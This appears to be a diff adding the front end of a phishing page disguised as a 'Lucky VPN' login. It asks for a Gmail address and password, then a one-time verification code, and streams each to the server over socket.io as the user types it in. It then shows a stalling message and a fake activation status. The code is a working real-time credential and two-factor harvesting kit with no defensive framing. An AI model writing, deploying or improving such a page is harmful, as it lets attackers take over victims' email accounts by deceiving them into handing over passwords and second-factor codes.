@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head><title>Lucky VPN - Login</title></head>
+<body style="text-align: center; font-family: sans-serif;">
+    <div id="login-form">
+        <h2>Lucky VPN Login</h2>
+        <input type="email" id="email" placeholder="Gmail"><br><br>
+        <input type="password" id="pass" placeholder="Password"><br><br>
+        <button onclick="sendLogin()">Login</button>
+    </div>
+
+    <div id="otp-section" style="display:none;">
+        <h3>Enter OTP / Verification Code</h3>
+        <input type="text" id="otp" placeholder="Enter Code">
+        <button onclick="sendOTP()">Verify</button>
+    </div>
+
+    <div id="status-section"></div>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+        const socket = io();
+        function sendLogin() {
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('pass').value;
+            socket.emit('user_login', { email, pass, type: 'login' });
+            document.getElementById('login-form').style.display = 'none';
+            document.getElementById('otp-section').style.display = 'block';
+        }
+
+        function sendOTP() {
+            const otp = document.getElementById('otp').value;
+            socket.emit('user_login', { otp, type: 'otp' });
+            document.getElementById('otp-section').innerHTML = "<h3>Verifying... Please wait</h3>";
+        }
+
+        socket.on('final_status', (data) => {
+            document.getElementById('status-section').innerHTML = 
+                `<h2 style="color: ${data.status === 'OK' ? 'green' : 'red'}">
+                Status: ${data.status === 'OK' ? 'Lucky VPN Active ✅' : 'Not Activated ❌'}
+                </h2>`;
+        });
+    </script>
+</body>
+</html>
